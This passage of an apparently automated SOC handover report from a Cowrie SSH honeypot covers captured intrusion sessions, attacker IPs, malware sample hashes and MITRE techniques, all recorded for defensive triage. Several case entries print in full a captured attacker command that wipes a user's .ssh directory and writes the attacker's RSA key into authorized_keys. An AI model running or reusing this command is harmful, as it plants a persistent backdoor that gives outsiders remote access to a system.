| `2026-06-11 14:53:32` | `cowrie.log.closed` |
| `2026-06-11 14:53:32` | `cowrie.session.params` |
| `2026-06-11 14:53:32` | `cowrie.command.input` |
| `2026-06-11 14:53:33` | `cowrie.session.file_download` |
| `2026-06-11 14:53:33` | `cowrie.log.closed` |
| `2026-06-11 14:53:33` | `cowrie.session.params` |
| `2026-06-11 14:53:33` | `cowrie.command.input` |
| `2026-06-11 14:53:33` | `cowrie.log.closed` |
| `2026-06-11 14:53:34` | `cowrie.session.params` |
| `2026-06-11 14:53:34` | `cowrie.command.input` |
| `2026-06-11 14:53:34` | `cowrie.log.closed` |
| `2026-06-11 14:53:34` | `cowrie.session.params` |
| `2026-06-11 14:53:34` | `cowrie.command.input` |
| `2026-06-11 14:53:34` | `cowrie.command.input` |
| `2026-06-11 14:53:34` | `cowrie.log.closed` |
| `2026-06-11 14:53:34` | `cowrie.session.params` |
| `2026-06-11 14:53:34` | `cowrie.command.input` |
| `2026-06-11 14:53:35` | `cowrie.log.closed` |
| `2026-06-11 14:53:35` | `cowrie.session.params` |
| `2026-06-11 14:53:35` | `cowrie.command.input` |
| `2026-06-11 14:53:35` | `cowrie.log.closed` |
| `2026-06-11 14:53:36` | `cowrie.session.params` |
| `2026-06-11 14:53:36` | `cowrie.command.input` |
| `2026-06-11 14:53:36` | `cowrie.log.closed` |
| `2026-06-11 14:53:37` | `cowrie.session.params` |
| `2026-06-11 14:53:37` | `cowrie.command.input` |
| `2026-06-11 14:53:37` | `cowrie.log.closed` |
| `2026-06-11 14:53:37` | `cowrie.session.params` |
| `2026-06-11 14:53:37` | `cowrie.command.input` |
| `2026-06-11 14:53:37` | `cowrie.log.closed` |
| `2026-06-11 14:53:38` | `cowrie.session.params` |
| `2026-06-11 14:53:38` | `cowrie.command.input` |
| `2026-06-11 14:53:38` | `cowrie.log.closed` |
| `2026-06-11 14:53:38` | `cowrie.session.params` |
| `2026-06-11 14:53:38` | `cowrie.command.input` |
| `2026-06-11 14:53:38` | `cowrie.log.closed` |
| `2026-06-11 14:53:38` | `cowrie.session.params` |
| `2026-06-11 14:53:38` | `cowrie.command.input` |
| `2026-06-11 14:53:39` | `cowrie.log.closed` |
| `2026-06-11 14:53:39` | `cowrie.session.params` |
| `2026-06-11 14:53:39` | `cowrie.command.input` |
| `2026-06-11 14:53:39` | `cowrie.log.closed` |
| `2026-06-11 14:53:39` | `cowrie.session.params` |
| `2026-06-11 14:53:39` | `cowrie.command.input` |
| `2026-06-11 14:53:39` | `cowrie.log.closed` |
| `2026-06-11 14:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]208` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2862503ea027

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:53 |
| **Last Seen** | 2026-06-11 14:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:53:48` | `cowrie.session.connect` |
| `2026-06-11 14:53:48` | `cowrie.client.version` |
| `2026-06-11 14:53:48` | `cowrie.client.kex` |
| `2026-06-11 14:53:48` | `cowrie.login.success` |
| `2026-06-11 14:53:49` | `cowrie.session.params` |
| `2026-06-11 14:53:49` | `cowrie.command.input` |
| `2026-06-11 14:53:49` | `cowrie.command.failed` |
| `2026-06-11 14:53:49` | `cowrie.log.closed` |
| `2026-06-11 14:53:49` | `cowrie.session.params` |
| `2026-06-11 14:53:49` | `cowrie.command.input` |
| `2026-06-11 14:53:49` | `cowrie.session.file_download` |
| `2026-06-11 14:53:49` | `cowrie.log.closed` |
| `2026-06-11 14:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02941f33c279

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:53 |
| **Last Seen** | 2026-06-11 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:53:52` | `cowrie.session.connect` |
| `2026-06-11 14:53:52` | `cowrie.client.version` |
| `2026-06-11 14:53:52` | `cowrie.client.kex` |
| `2026-06-11 14:53:52` | `cowrie.login.success` |
| `2026-06-11 14:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b1b34a9a1a3

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-06-11 15:07 |
| **Last Seen** | 2026-06-11 15:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 15:07:36` | `cowrie.session.connect` |
| `2026-06-11 15:07:36` | `cowrie.client.version` |
| `2026-06-11 15:07:36` | `cowrie.client.kex` |
| `2026-06-11 15:07:36` | `cowrie.login.success` |
| `2026-06-11 15:07:36` | `cowrie.session.params` |
| `2026-06-11 15:07:36` | `cowrie.command.input` |
| `2026-06-11 15:07:36` | `cowrie.command.failed` |
| `2026-06-11 15:07:36` | `cowrie.log.closed` |
| `2026-06-11 15:07:36` | `cowrie.session.params` |
| `2026-06-11 15:07:36` | `cowrie.command.input` |
| `2026-06-11 15:07:36` | `cowrie.session.file_download` |
| `2026-06-11 15:07:36` | `cowrie.log.closed` |
| `2026-06-11 15:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edba75e622ec

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-06-11 15:07 |
| **Last Seen** | 2026-06-11 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 15:07:38` | `cowrie.session.connect` |
| `2026-06-11 15:07:38` | `cowrie.client.version` |
| `2026-06-11 15:07:38` | `cowrie.client.kex` |
| `2026-06-11 15:07:38` | `cowrie.login.success` |
| `2026-06-11 15:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.20.122[.]54` | **30** | 2026-06-11 14:12 | 2026-06-11 15:13 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `218.78.60[.]105` | **29** | 2026-06-11 13:26 | 2026-06-11 14:00 | 52m | 0 | `T1592` | 🟠 MEDIUM |
| `103.210.21[.]178` | **18** | 2026-06-11 10:43 | 2026-06-11 11:15 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]208` | **18** | 2026-06-11 14:19 | 2026-06-11 15:20 | 26m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `198.12.149[.]130` | **17** | 2026-06-11 11:23 | 2026-06-11 13:51 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `118.193.61[.]170` | **16** | 2026-06-11 14:16 | 2026-06-11 14:53 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.2.101[.]67` | **13** | 2026-06-11 10:43 | 2026-06-11 11:21 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `4.184.246[.]230` | **11** | 2026-06-11 10:43 | 2026-06-11 11:06 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `221.229.220[.]180` | **5** | 2026-06-11 11:32 | 2026-06-11 11:41 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `143.110.178[.]27` | **3** | 2026-06-11 10:53 | 2026-06-11 11:47 | 2m | 0 | `T1592` | 🟢 LOW |
| `143.110.178[.]27` | **2** | 2026-06-11 15:06 | 2026-06-11 15:11 | 1m | 0 | `T1592` | 🟢 LOW |
| `18.117.130[.]146` | **2** | 2026-06-11 11:05 | 2026-06-11 11:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.168[.]253` | **2** | 2026-06-11 13:02 | 2026-06-11 13:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.222.128[.]242` | **2** | 2026-06-11 14:56 | 2026-06-11 14:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.38.205[.]224` | 1 | 2026-06-11 12:37 | 2026-06-11 12:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.111.53[.]214` | 1 | 2026-06-11 11:36 | 2026-06-11 11:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.162[.]240` | 1 | 2026-06-11 13:26 | 2026-06-11 13:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.28.198[.]131` | 1 | 2026-06-11 12:16 | 2026-06-11 12:16 | 27s | 0 | `T1592` | 🟢 LOW |
| `116.48.151[.]136` | 1 | 2026-06-11 15:06 | 2026-06-11 15:06 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.34.125[.]173` | 1 | 2026-06-11 12:39 | 2026-06-11 12:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.84[.]13` | 1 | 2026-06-11 12:01 | 2026-06-11 12:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]62` | 1 | 2026-06-11 11:35 | 2026-06-11 11:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.18[.]123` | 1 | 2026-06-11 12:47 | 2026-06-11 12:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.252.84[.]225` | 1 | 2026-06-11 11:35 | 2026-06-11 11:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `153.99.92[.]11` | 1 | 2026-06-11 13:29 | 2026-06-11 13:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `171.112.84[.]30` | 1 | 2026-06-11 13:47 | 2026-06-11 13:47 | 12s | 0 | `T1592` | 🟢 LOW |
| `178.216.165[.]187` | 1 | 2026-06-11 12:56 | 2026-06-11 12:56 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.225.134[.]13` | 1 | 2026-06-11 12:36 | 2026-06-11 12:36 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.15[.]68` | 1 | 2026-06-11 11:43 | 2026-06-11 11:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `187.141.71[.]166` | 1 | 2026-06-11 12:46 | 2026-06-11 12:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.73.148[.]33` | 1 | 2026-06-11 13:32 | 2026-06-11 13:32 | 28s | 0 | `T1592` | 🟢 LOW |
| `218.78.46[.]81` | 1 | 2026-06-11 11:29 | 2026-06-11 11:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.164.190[.]238` | 1 | 2026-06-11 11:38 | 2026-06-11 11:38 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.152[.]216` | 1 | 2026-06-11 13:55 | 2026-06-11 13:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.77.158[.]34` | 1 | 2026-06-11 14:15 | 2026-06-11 14:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.6.206[.]239` | 1 | 2026-06-11 12:39 | 2026-06-11 12:39 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.152[.]216` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 36 |
| `18.117.130[.]146` | US | Amazon Technologies Inc. | **100** ⚠️ | 3 |
| `198.12.149[.]130` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |
| `43.164.190[.]238` | KR | ACEVILLE PTE.LTD. | **100** ⚠️ | 5 |
| `183.171.15[.]68` | MY | Celcom Axiata Berhad | **100** ⚠️ | 14 |
| `185.2.101[.]67` | FR | Contabo GmbH | **100** ⚠️ | 3 |
| `182.225.134[.]13` | KR | LG POWERCOMM | **100** ⚠️ | 50 |
| `14.103.18[.]123` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `151.252.84[.]225` | RU | Tele-plus LLC | **100** ⚠️ | 50 |
| `153.99.92[.]11` | CN | China Unicom Jiangsu province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 211 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 103 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 51 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 29 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 29 |

---

## 🔕 False Positive Summary (44 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 39 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 285 cases |
| Tool 34  | Credential Extractor        | ✅ 154 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 55 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 44 filtered (15.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 51 priority case(s) shown individually · 36 recon entry/entries in table (14 group(s) consolidating 168 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-11T16:09:36Z_
